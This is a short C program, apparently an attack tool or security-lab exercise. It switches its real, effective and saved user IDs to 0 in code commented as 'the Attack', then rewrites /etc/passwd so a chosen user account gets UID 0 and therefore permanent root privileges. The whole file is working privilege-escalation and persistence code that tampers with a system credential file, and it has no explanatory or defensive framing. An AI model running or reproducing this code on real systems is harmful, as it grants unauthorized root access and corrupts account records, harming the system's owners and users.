#define _GNU_SOURCE

#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>

#include <stdlib.h>
#include <string.h>

void modify_passwd_file(int user_id, char *user_name) {
    FILE *old_passwd = fopen("/etc/passwd", "r");
    FILE *new_passwd = fopen("/etc/passwd.tmp", "w");

    if (old_passwd == NULL || new_passwd == NULL) {
        perror("Error opening file");
        exit(1);
    }

    char line[256], str[256];
    sprintf(str, "%s:x:%d:%d:Linux User,,,:/home/%s:/bin/sh\n", user_name, user_id, user_id, user_name);
    // Change the UID of userX from X to 0 (root)
    while (fgets(line, sizeof(line), old_passwd)) {
        if (strcmp(line, str) == 0) {
            fprintf(new_passwd, "%s:x:0:0:Linux User,,,:/home/%s:/bin/sh\n", user_name, user_name);
        } else {
            fprintf(new_passwd, "%s", line);
        }
    }

    fclose(old_passwd);
    fclose(new_passwd);

    // Replace the old passwd file with the new one
    if (rename("/etc/passwd.tmp", "/etc/passwd") != 0) {
        perror("Error renaming file");
        exit(1);
    }
}

int main(int argc, char *argv[]) {

    uid_t ruid, euid, suid;
 
    if (argc != 3) {
        printf("Usage: %s <user_id> <user_name>\n", argv[0]);
        return 1;
    }

    // Get the real, effective, and saved user IDs
    if (getresuid(&ruid, &euid, &suid) == -1) {
        perror("getresuid");
        return 1;
    }

    // Display the user IDs Before the Attack
    printf("Real      UID: %d\n", ruid);
    printf("Effective UID: %d\n", euid);
    printf("Saved     UID: %d\n", suid);

    printf("--\n");
    // Elevate the privileges
    setresuid(0, 0, 0);

    if (getresuid(&ruid, &euid, &suid) == -1) {
        perror("getresuid");
        return 1;
    }

    // Display the user IDs After the Attack (Should be all 0)
    printf("Real      UID: %d\n", ruid);
    printf("Effective UID: %d\n", euid);
    printf("Saved     UID: %d\n", suid);

    // Modify the /etc/passwd file to give user1 root privileges
    modify_passwd_file(atoi(argv[1]), argv[2]);    

    printf("\nUser1 now has root privileges\n"
           "Reset your SHELL to update privileges\n");

    return 0;
}
